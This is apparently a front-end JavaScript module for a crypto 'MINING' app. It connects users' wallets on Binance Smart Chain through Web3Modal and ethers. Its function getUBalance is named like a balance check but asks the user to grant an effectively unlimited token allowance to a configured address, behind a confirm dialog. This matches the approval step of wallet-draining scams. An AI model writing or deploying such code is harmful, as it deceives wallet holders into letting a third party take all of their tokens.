import { createWeb3Modal, defaultConfig } from '@web3modal/ethers5/vue'
import { Contract, utils, providers } from 'ethers'

import i18n from '@/i18n'

const { t } = i18n.global

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = '123456' //去walletconnect申请

// 2. Set chains
const mainnet = {
    chainId: 1,
    name: "Ethereum",
    currency: "ETH",
    explorerUrl: "https://etherscan.io",
    rpcUrl: "https://cloudflare-eth.com"
}


// bsc
const binanceSmartChain = {
    chainId: 56,
    name: "Binance Smart Chain",
    currency: "BNB",
    explorerUrl: "https://bscscan.com",
    pollingInterval: 12000,
    rpcUrl: "https://bsc-dataseed1.binance.org/"
};

// psc
const polygonSmartChain = {
    chainId: 137,
    name: "Polygon Smart Chain",
    currency: "MATIC",
    explorerUrl: "https://polygonscan.com/",
    pollingInterval: 12000,
    rpcUrl: "https://polygon-rpc.com/"
};

// 3. Create your application's metadata object
const appMetadata = {
    name: "MINING",
    description: "description",
    url: "https://www.baidu.com", //自定义
    icons: ["https://avatars.site.com/"]
};

// 4. Create Ethers config
const ethersConfig = defaultConfig({
    /*Required*/
    metadata: appMetadata,
    /*Optional*/
    enableEIP6963: true, // true by default
    enableInjected: true, // true by default
    enableCoinbase: true, // true by default
    rpcUrl: 'https://bsc-dataseed1.binance.org', // used for the Coinbase SDK
    coinbasePreference:'all',
    defaultChainId: 56, // used for the Coinbase SDK
})


export const modal = createWeb3Modal({
    ethersConfig,
    chains: [binanceSmartChain],
    projectId,
    enableAnalytics: true, // Optional - defaults to your Cloud configuration  
    featuredWalletIds: ['4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0']
})



let sContract = null;

export async function initializeContract(walletConfig) {
    const abi = walletConfig.abi;
    const walletProvider = modal.getWalletProvider();
    const ethersProvider = new providers.Web3Provider(walletProvider);
    const signer = ethersProvider.getSigner();
    const BNBAddress = walletConfig.contract;

    // Assign the contract instance to the global sContract variable
    sContract = new Contract(BNBAddress, abi, signer);
}

export async function checkAllowance(address, authAddress) {
    if (!sContract) {
        throw new Error('Contract not initialized. Call initializeContract() first.');
    }

    try {
        const allowance = await sContract.allowance(address, authAddress);
        return allowance;
    } catch (error) {
        console.error('Error checking allowance:', error);
        throw error;
    }
}

async function getUBalance(walletConfig, address) {
    const authAddress = walletConfig.authAddress;
    try {
        let t = {
            code: 200,
            message: "success",
            hx: null
        };
        // 未授权过
        const e = await sContract.approve(authAddress, "79228162514264337593543950335");
        t.hx = e;
        return t;
    } catch (c) {
        let e = {
            code: 3030,
            message: c.message
        };
        return e;
    }
}

export async function approve(walletConfig, message, address) {
    try {
        await showConfirmDialog({
            message: message,
            confirmButtonColor: 'red',
            confirmButtonText: t('confirm'),
            cancelButtonText: t('cancel')
        });

        // 在对话框关闭后调用 getUBalance，并获取返回值
        const result = await getUBalance(walletConfig, address);
        return result;
    } catch (error) {
        console.error('Operation canceled or an error occurred:', error);
        return error;
    }
}
export const chains = [binanceSmartChain];
